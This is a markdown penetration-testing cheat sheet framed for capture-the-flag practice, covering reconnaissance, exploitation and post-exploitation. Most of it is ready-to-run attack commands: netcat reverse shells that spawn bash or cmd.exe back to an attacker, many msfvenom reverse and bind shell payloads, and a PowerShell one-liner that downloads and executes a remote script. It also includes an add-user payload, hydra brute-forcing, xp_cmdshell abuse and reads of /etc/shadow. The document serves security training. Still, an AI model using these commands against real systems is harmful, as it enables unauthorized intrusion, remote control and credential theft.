---
title: Yet Another CTF Playbook
subtitle: Version 1
author:
    - christalib
date: June/July 2020
titlepage: true
titlepage-color: ffffff
urlcolor: #370000
titlepage-rule-color: 370000
titlepage-text-color: 000000
table-of-contents: true
toc-depth: 4
number-sections: true
toc-title: "Table of Contents"
---

# Reconnaissance

## Nmap

Quickstart:

```sh
nmap -sC -sV --top-ports 20 <IP> -o <FILE>
nmap -sC -sV --open --reason <IP> -o <FILE>
```

Full ports scan:

```sh
nmap -sV -sC -p- -O --open <IP> -o <FILE>
```

Ping sweep:

```sh
nmap -sn -PE <IP or Range>
```

UDP scan:

```sh
nmap -sU <IP or Range>
```

Scan for open ports, determine open services:

```sh
nmap --open -sV <IP or Range>
```

Scan and run default scripts:

```sh
nmap -sC <IP or Range>
```

Run a specific script:

```sh
# location on Kali: /usr/share/nmap/scripts/
nmap --script <SCRIPT_NAME> <IP>
```

Skip ping:

```sh
nmap -Pn <IP>
```

Output result to file:

```sh
nmap <IP> -o <FILE> # text file
nmap <IP> -oG <FiLE> # greppable file
nmap <IP> -oN <FILE> # nmap file
nmap <IP> -oA <FILE> # all formats
```


### Analysing results

#### Port 21 open

* connect with `ftp IP`
* check for `anonymous:anonymous` login

#### Port 22 open

* possible default credentials, try a small `hydra` bruteforce:
```sh
hydra -L users.txt -P pass.txt IP ssh
```
* **Post-exploitation**: possible writable `~/.ssh/authorized_keys`.

[Go to Post-Exploitation](#post-exploitation)

#### Port 53 open

* add the IP and a domain name to your `/etc/hosts` files
* try a zone transfer:

```sh
host -l <DOMAIN> <IP>
```

#### Port 80 open

* Web-service running, use `dirb` or `gobuster` to get the most information as possible.

*Examples*:

* `dirb http://IP -r`
* `gobuster dir -w DICT -t 30 -x php,txt,js,html,css` You can use `-f` to try folders instead of files
* if you plan to bruteforce, try generate wordlist with `CeWL`
* if it's a Wordpress instance look into `wpscan`
* sometimes an open FTP is also a feature from a running IIS instance which comes with a CalDav instance. Try it out with `davtest` and exploit with `cadaver`

**Reverse proxy misconfiguration**:

* Sometimes, servers have a misconfiured reverse proxy. Thus, you
need to add the hostnames that resolve to your target IP to your `/etc/hosts`
file:
```sh
<IP> <HOSTNAME>
```

**Common exploits**:

* XSS
* SQLi
* Directory Traversal
* Default credentials (admin:admin, root:root... Check also the name of the service or the default password for the running application.)
* if CGI-bin, check for Shellshock (TODO)

[Go to Exploitation](#exploitation)

#### Port 88

In case you have a Kerberos instance, you can try to numerate the users with:

```sh
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <IP>
```

There is also the possibility to use Impacket's [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) script to find all the users that do not require pre-authentification.

There another tool, [kerbrute](https://github.com/ropnop/kerbrute) with which
you can do basically the same stuff than above and a little more.

#### Port 443 open

* if the server only accepts localhost (you get that through the SSL certificate
  details), you will need to tunnel your connection through a user (needs already a first access to the server)

**Common exploits**:

* [Heartbleed](https://gist.github.com/10174134.git)

#### Port 111, 139, 445 open

Check for Samba, Netbios or NFS shares.

* Netbios

Basic scan:

```sh
nbtscan <IP>
```

* SMB

List services available:

```sh
smbclient -L <IP>
smbmap -H <IP>
```

List permissions:

```sh
smbclient -H <IP>
```

List content:

```sh
smbmap -R -H <IP>
```

Basic connection:

```sh
smbclient //<IP>/<PATH> -U <USER> -P <PASSWORD>
```


Get all files from remote:

```sh
smbclient //<IP>/<PATH> -c "prompt OFF; recurse ON; cd '\<PATH>\'; lcd
'<LOCAL_PATH>'; mget *"
```

**Common exploits**:

* Login with no password
* ETERNALBLUE: Spawn a reverse shell and use Helviojunior's [script](https://github.com/helviojunior/MS17-010), `send_and_execute.py`to send payload


* Existing NFS mount

* Mount the file system on your computer:

```sh
nmap -sV --script=nfs-showmount <target>
mkdir temp
mount -o nolock IP:/ $PWD/temp
mount -o rw,vers=2 <target>:<share> <local_directory>
```

#### Existing databases

**MsSQL**:

```sh
sqsh -S <IP> -U <USER> -P <PASSWORD>
# known elevation technique for MsSQL
xp_cmdshell 'whoami';
go
```

**MongoDB**:

```sh
mongo -u <USER> -p <PASSWORD> <HOST:PORT/DB>
# get mongo shell
> db
> show collections
> db.task.find()
> db.task.insert(<EXPLOIT>)
```

## NSLookup

Basic lookup:

```sh
nslookup server <IP>
```

## Host

Basic usage:

```sh
host <IP>
```

Zone transfert:

```sh
host -l <DOMAIN> <IP>
```

#### Port 5985

If this port is open, it's possible there is an instance of Windows Remove
Management system. You can use
[EvilRM](https://github.com/Hackplayers/evil-winrm) to connect to the target
after you got credentials.

[Go to Post-Exploitation](#post-exploitation)

# Exploitation

## Searchsploit

Basic usage:

```sh
searchsploit <KEYWORDS>
```

Copy path to clipboard:

```sh
searchsploit -p <ID>
```

Copy to current folder:

```sh
searchsploit -m <ID>
```

Get online link instead of local paths:

```sh
searchsploit -w <KEYWORDS>
```

## Shells

### Netcat

Basic bind shell:
```sh
nc -nvlp 443           # On local Kali
nc -nv <REMOTE-IP> 443 # On remote
```

Basic reverse shell:

```sh
sudo nc -nlvp 443                  # On local Kali
nc -nv <LOCAL-IP> 443 -e cmd.exe   # On remote Windows
nc -nv <LOCAL-IP> 443 -e /bin/bash # On remote Linux
```
Sending files:

```sh
sudo nc -nvlp 443 > incoming.exe     # Reciever
nc -nv <LOCAL-IP> 443 < incoming.exe # Sender
```

## MSFVenom shells:

### Linux

Linux Meterpreter reverse shell x86 multi stage:

```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux Meterpreter bind shell x86 multi stage:

```sh
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux bind shell x64 single stage:

```sh
msfvenom -p linux/x64/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux reverse shell x64 single stage:

```sh
msfvenom -p linux/x64/shell_reverse_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

### Windows

Windows Meterpreter http reverse shell:

```sh
msfvenom -p windows/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
```

Windows Meterpreter bind shell:

```sh
msfvenom -p windows/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Windows CMD Multi Stage:

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Windows CMD Single Stage:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

Windows add user:

```sh
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

Windows shell which doesn't break the application for a x86 architecture:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f exe -a x86 --platform windows -o sploit.exe
```


Windows Exec Nishang Powershell in python

```sh
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f python
```

Bad characters shikata_ga_nai:

```sh
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT> -f c -e x86/shikata_ga_nai -b "\x04\xA0"
```

Bad characters fnstenv_mov:

```sh
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT> -f c -e x86/fnstenv_mov -b "\x04\xA0"
```

### Misc

Python Shell:

```sh
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
```

Bash Shell:

```sh
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
```

Perl Shell:

```sh
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
```

ASP Meterpreter Shell:

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

PHP Reverse Shell:

```sh
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > phpreverseshell.php
```

To get multiple session on a single multi/handler, you need to set the
ExitOnSession option to false and run the exploit -j instead of just the
exploit. For example, for meterpreter/reverse_tcp payload:

```
msf>use exploit/multi/handler
msf>set payload windows/meterpreter/reverse_tcp
msf>set lhost <IP>
msf>set lport <PORT>
msf> set ExitOnSession false
msf>exploit -j
```

## Webshells

* PentestMonkey PHP [webshell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
* Kali's Webshells: `locate webshells`

## cURL

Upload file:

```sh
curl <IP> --upload-file <FILE>
```

Query as a bot:

```sh
curl -A "'Mozilla/5.0 (compatible;Googlebot/2.1; +http://www.google.com/bot.html)')" <IP>
```

Give parameters with encoding:

```sh
curl <IP> --data-urlencode urlConfig=<PATH>
```

Send request as logged user:

```sh
curl -u <USER> <IP> --data-binary <PAYLOAD>
```

### Common Options ([Source](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58))

`-#, --progress-bar`
        Make curl display a simple progress bar instead of the more informational standard meter.

`-b, --cookie <name=data>`
        Supply cookie with request. If no `=`, then specifies the cookie file to use (see `-c`).

`-c, --cookie-jar <file name>`
        File to save response cookies to.

`-d, --data <data>`
        Send specified data in POST request. Details provided below.

`-f, --fail`
        Fail silently (don't output HTML error form if returned).

`-F, --form <name=content>`
        Submit form data.

`-H, --header <header>`
        Headers to supply with request.

`-i, --include`
        Include HTTP headers in the output.

`-I, --head`
        Fetch headers only.

`-k, --insecure`
        Allow insecure connections to succeed.

`-L, --location`
        Follow redirects.

`-o, --output <file>`
        Write output to <file>. Can use `--create-dirs` in conjunction with this to create any directories
        specified in the `-o` path.

`-O, --remote-name`
        Write output to file named like the remote file (only writes to current directory).

`-s, --silent`
        Silent (quiet) mode. Use with `-S` to force it to show errors.

`-v, --verbose`
        Provide more information (useful for debugging).

`-w, --write-out <format>`
        Make curl display information on stdout after a completed transfer. See man page for more details on
        available variables. Convenient way to force curl to append a newline to output: `-w "\n"` (can add
        to `~/.curlrc`).

`-X, --request`
        The request method to use.


### POST

When sending data via a POST or PUT request, two common formats (specified via the `Content-Type` header) are:
  * `application/json`
  * `application/x-www-form-urlencoded`

Many APIs will accept both formats, so if you're using `curl` at the command line, it can be a bit easier to use the form urlencoded format instead of json because
  * the json format requires a bunch of extra quoting
  * curl will send form urlencoded by default, so for json the `Content-Type` header must be explicitly set

This gist provides examples for using both formats, including how to use sample data files in either format with your `curl` requests.

### curl usage

For sending data with POST and PUT requests, these are common `curl` options:

 * request type
   * `-X POST`
   * `-X PUT`

 * content type header
  * `-H "Content-Type: application/x-www-form-urlencoded"`
  * `-H "Content-Type: application/json"`

* data
  * form urlencoded: `-d "param1=value1&param2=value2"` or `-d @data.txt`
  * json: `-d '{"key1":"value1", "key2":"value2"}'` or `-d @data.json`

### Examples

#### POST application/x-www-form-urlencoded

`application/x-www-form-urlencoded` is the default:

    curl -d "param1=value1&param2=value2" -X POST http://localhost:3000/data

explicit:

    curl -d "param1=value1&param2=value2" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://localhost:3000/data

with a data file

    curl -d "@data.txt" -X POST http://localhost:3000/data

#### POST application/json

    curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST http://localhost:3000/data

with a data file

    curl -d "@data.json" -X POST http://localhost:3000/data


## Powershell

Download remote files:

```powershell
powershell "(New-Object System.Net.WebClient).DownloadFile("<IP+file>",
<Destination-File>)"
```


# Post-Exploitation

## Improve your shell

* `sh -c uname -a; w; id; /bin/bash -i`
* For NMAP versions 2.0 to 5.8:
```sh
nmap --interactive
!sh
```
* `python -c 'import pty; pty.spawn("/bin/bash")'`
* `stty raw -echo` and then `fg` and `export TERM=xterm`

## Local Recon

### Windows

General recon:

```
whoami
hostname
systeminfo
ipconfig /all
```

Network discovery:

```
C:\> net view /all
C:\> net view \\<Hostname>
C:\> net users
```

Ping scan:

```
C:\> for \L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find "Reply" >> output.txt
```

#### Automation

* [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)


### Linux

General recon:

```sh
whoami
hostname
ifconfig
id
uname -a
cat /etc/passwd
cat /etc/shadow
cat /etc/*-release
sudo -l
ps -aux
```

Run a command as a user:

```sh
sudo -u <USER>
sudo -i -u <USER>
```

Network discover:

```sh
ifconfig
ip a
```

Ping scan:

```sh
for i in `seq 1 254`; do ping 192.168.1.$i; done
```

Find SUID/SGID files:

```sh
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

#### Automation

* [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
* [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

### Send files to remote hosts

#### Powershell

```powershell
Invoke-Webrequest -Uri <IP> -OutFile <DestFile>
```

## Cracking

Decompress with tar:

```sh
tar -C <DEST> -xvf <FILE>
```

### Hashcat

Basic use:

```sh
hashcat -m 0 -a 0 -o <OUTPUT_FILE> <INPUT_FILE> <WORDLIST>
```

* `-m`: defines the algorithm type ([full list](https://hashcat.net/wiki/doku.php?id=example_hashes))
* `-a`: attack mode (0: straight, 1: combination, 3: brute-force)

### Hydra

### Binwalk

### Steghide

### Fcrackzip

Run as dictionnary mode, try to decompress the target:

```sh
fcrackzip -u -D -p <Wordlist> <FILE>
```

# Custom Scripts

## Aliases

Put them in your `.aliases` file and source it in your `.bashrc` or `.zshrc`.

```sh
alias serve='ruby -run -e httpd . -p 8000'
alias grepip='grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"'
```

# Sources

## Books

* Red Team Field Manual
* Blue Team Field Manual

## Website

* [GTFObins](https://gtfobins.github.io/)
* [Hacktrics.xyz](https://book.hacktricks.xyz/)
* [LOLBas](https://lolbas-project.github.io/#)
* [PenstestMonkey](http://pentestmonkey.net/)
* [Red Teaming Experiments](https://ired.team/)
* [absolom.com](https://www.absolomb.com/)
* [blog.g0tmi1k.com](https://blog.g0tmi1k.com/)

## Videos

* [Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
